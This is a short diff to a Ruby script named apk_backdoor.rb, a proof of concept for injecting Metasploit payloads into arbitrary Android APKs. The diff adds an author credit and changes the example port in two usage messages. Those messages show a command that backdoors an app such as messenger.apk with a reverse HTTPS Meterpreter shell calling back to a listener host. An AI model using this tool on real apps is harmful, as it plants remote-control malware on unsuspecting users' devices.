@@ -2,6 +2,7 @@
 # apk_backdoor.rb
 # This script is a POC for injecting metasploit payloads on 
 # arbitrary APKs.
+# Authored by timwr, Jack64
 #
 
 
@@ -128,7 +129,7 @@ end
 apkfile = ARGV[0]
 unless(apkfile && File.readable?(apkfile))
 	puts "Usage: #{$0} [target.apk] [msfvenom options]\n"
-	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=4443"
+	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
 	exit(1)
 end
 
@@ -159,7 +160,7 @@ begin
 	}
 rescue
 	puts "Usage: #{$0} [target.apk] [msfvenom options]\n"
-	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=4443"
+	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
 	puts "[-] Error parsing msfvenom options. Exiting.\n"
 	exit(1)
 end
